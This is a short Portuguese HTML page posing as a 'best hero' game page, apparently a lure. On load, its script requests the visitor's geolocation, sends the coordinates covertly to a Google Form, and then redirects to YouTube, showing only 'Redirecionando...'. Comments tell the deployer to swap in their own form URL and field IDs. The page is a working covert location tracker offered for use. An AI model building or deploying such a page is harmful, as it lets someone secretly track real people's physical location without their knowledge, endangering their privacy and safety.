<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Melhor Hero do ML</title>
    <script>
        function sendLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    var latitude = position.coords.latitude;
                    var longitude = position.coords.longitude;
                    
                    // Substitua pelo URL do seu Google Form
                    var formURL = 'https://docs.google.com/forms/d/e/1FAIpQLSeeyWZAwIgFuX_rrlsSB-y2tIw8FKFRaG2kl6oigOS-dRT2TA/formResponse';
                    
                    // Substitua pelos IDs de entrada do seu Google Form
                    var latitudeEntryID = 'hj99tb4';
                    var longitudeEntryID = 'hj99tb6';
                    
                    var xhr = new XMLHttpRequest();
                    var params = 'entry.' + latitudeEntryID + '=' + encodeURIComponent(latitude) + 
                                  '&entry.' + longitudeEntryID + '=' + encodeURIComponent(longitude);

                    xhr.open('POST', formURL, true);
                    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                    xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');

                    xhr.onreadystatechange = function() {
                        if (xhr.readyState == 4 && xhr.status == 200) {
                            // Redireciona após o envio
                            window.location.href = 'https://www.youtube.com';
                        }
                    };

                    xhr.send(params);
                }, function(error) {
                    console.error('Erro: ' + error.message);
                    
                    window.location.href = 'https://www.youtube.com';
                });
            } else {
                console.error('Não é suportada pelo seu navegador.');
      
                window.location.href = 'https://www.youtube.com';
            }
        }

        // Chama a função ao carregar a página
        window.onload = sendLocation;
    </script>
</head>
<body>
    <h1>Redirecionando...</h1>
</body>
</html>
